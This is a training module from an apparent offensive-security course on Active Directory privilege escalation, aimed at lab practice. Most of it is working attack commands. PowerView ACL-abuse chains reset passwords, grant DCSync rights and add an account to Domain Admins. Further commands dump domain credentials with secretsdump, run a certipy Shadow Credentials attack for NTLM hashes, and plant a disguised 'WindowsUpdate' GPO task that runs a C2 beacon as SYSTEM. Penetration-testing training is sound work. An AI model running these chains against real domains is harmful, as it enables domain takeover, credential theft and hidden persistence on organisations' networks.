# Phase 13: Domain Privilege Escalation — Thinking in Paths

> **Why**: Domain privesc isn't a single technique — it's a mindset of reading BloodHound edges and translating them into actions. This phase trains you to see a path and execute it fluidly.

**Study time**: 1 week | **Difficulty**: Advanced

---

## Learning Objectives

- [ ] Execute a GenericAll → password reset → domain escalation chain
- [ ] Execute a WriteDACL → DCSync grant → DCSync chain
- [ ] Execute a Shadow Credentials attack
- [ ] Abuse GPO write rights for code execution
- [ ] Explain AdminSDHolder and when it enables persistence vs escalation

---

## 1. ACL Chain Execution

The pattern for every ACL-based escalation:

```
BloodHound shows edge: [your account/group] →[SomeRight]→ [target object]
                                                ↓
Read the edge's "Abuse Info" in BloodHound
                                                ↓
Execute the corresponding PowerView command
                                                ↓
Verify the result (got new creds? added to group? DCSync works?)
                                                ↓
Continue up the chain to DA
```

### GenericAll on User → Password Reset

```powershell
# WHY: GenericAll means full control. Resetting the password doesn't require knowing the old one.
$pw = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $pw -Verbose
# Now authenticate as targetuser:NewPass123!
```

### WriteDACL on Domain → Grant DCSync

```powershell
# WHY: WriteDACL means you can modify the domain object's ACL.
# You add the two replication rights that enable DCSync.
Add-DomainObjectACL -TargetIdentity "DC=lab,DC=local" \
  -PrincipalIdentity jdoe -Rights DCSync -Verbose

# Verify by running DCSync immediately:
secretsdump.py lab.local/jdoe:Password1@<dc_ip>
```

### WriteOwner → Become Owner → GenericAll

```powershell
# WHY: Object owner can modify its own DACL. WriteOwner = set yourself as owner.
Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity jdoe
# Now grant yourself full rights as owner:
Add-DomainObjectACL -TargetIdentity 'Domain Admins' \
  -PrincipalIdentity jdoe -Rights All
# Now add yourself to DA:
Add-DomainGroupMember -Identity 'Domain Admins' -Members jdoe
```

---

## 2. Shadow Credentials — Stealthier Than Password Reset

**Why it's stealthier**: Resetting a password disrupts the legitimate user (they notice they can't log in). Shadow Credentials injects a fake certificate key — the user's password still works normally.

```bash
# WHY: You write a fake public key to msDS-KeyCredentialLink.
# PKINIT allows authentication with this key instead of the password.
# You don't know the private key for the cert — but you created it, so you do.

certipy shadow auto -u jdoe@lab.local -p Password1 \
  -account targetuser -dc-ip <dc_ip>
# Output: targetuser NTLM hash (via PKINIT authentication)
# Use the hash for PtH — no password reset needed
```

---

## 3. GPO Abuse for Domain Code Execution

```bash
# Find GPOs you have write rights on
Get-DomainGPO | Get-DomainObjectACL -ResolveGUIDs |
  ? {$_.ActiveDirectoryRights -match "WriteProperty|GenericAll|CreateChild"}

# Add a computer startup task to a GPO
sliver (beacon) > execute-assembly ~/tools/SharpGPOAbuse.exe \
  --AddComputerTask \
  --TaskName "WindowsUpdate" \
  --Author "NT AUTHORITY\SYSTEM" \
  --Command "cmd.exe" \
  --Arguments "/c C:\Windows\Temp\beacon.exe" \
  --GPOName "Default Domain Policy"

# Force immediate GPO apply on target
Invoke-GPUpdate -Computer WS01 -Force
```

**WHY GPO abuse is powerful**: A single GPO can apply to hundreds of computers in an OU. Code execution via GPO runs as SYSTEM on every affected machine.

---

## Practice Labs

| Lab | Platform | Focus |
|-----|---------|-------|
| [HTB: Cascade](https://app.hackthebox.com/machines/Cascade) | HTB (Sub) | AD objects, custom attacks |
| [HTB: Resolute](https://app.hackthebox.com/machines/Resolute) | HTB (Free) | AD enum, DnsAdmin |
| [GOAD: ACL paths](https://github.com/Orange-Cyberdefense/GOAD) | Local | 5+ ACL exploitation paths |

---

## Phase 13 Mastery Checklist

- [ ] Can you execute GenericAll → password reset → authenticate as target?
- [ ] Can you execute WriteDACL → DCSync grant → DCSync the domain?
- [ ] Can you execute a Shadow Credentials attack end-to-end?
- [ ] Can you explain why Shadow Credentials is stealthier than password reset?
- [ ] Can you find and exploit a GPO write misconfiguration?

---

## Next Phase → **Phase 14: AD Persistence**
